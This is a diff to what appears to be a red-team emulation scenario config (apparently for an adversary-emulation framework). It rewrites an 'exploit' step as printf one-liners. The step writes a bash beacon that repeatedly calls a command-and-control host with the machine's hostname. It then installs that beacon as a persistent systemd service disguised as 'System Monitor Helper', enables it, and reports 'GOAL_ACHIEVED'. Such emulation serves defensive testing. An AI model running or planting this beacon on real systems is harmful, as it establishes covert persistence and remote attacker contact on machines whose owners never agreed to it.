@@ -19,24 +19,9 @@ caldera:
   exploit:
     description: "Install a persistent beacon via systemd service"
     command: |
-      cat > /tmp/beacon.sh << 'BEACON'
-#!/bin/bash
-while true; do
-  curl -sk "http://c2.redteam.local/beacon?host=$(hostname)" || true
-  sleep 300
-done
-BEACON
+      printf '#!/bin/bash\nwhile true; do\n  curl -sk "http://c2.redteam.local/beacon?host=$(hostname)" || true\n  sleep 300\ndone\n' > /tmp/beacon.sh
       chmod +x /tmp/beacon.sh
-      cat > /etc/systemd/system/sysmon-helper.service << 'SVC'
-[Unit]
-Description=System Monitor Helper
-After=network.target
-[Service]
-ExecStart=/tmp/beacon.sh
-Restart=always
-[Install]
-WantedBy=multi-user.target
-SVC
+      printf '[Unit]\nDescription=System Monitor Helper\nAfter=network.target\n[Service]\nExecStart=/tmp/beacon.sh\nRestart=always\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/sysmon-helper.service
       systemctl daemon-reload && systemctl enable sysmon-helper && systemctl start sysmon-helper && echo "GOAL_ACHIEVED: c2 beacon installed"
 
 verification:
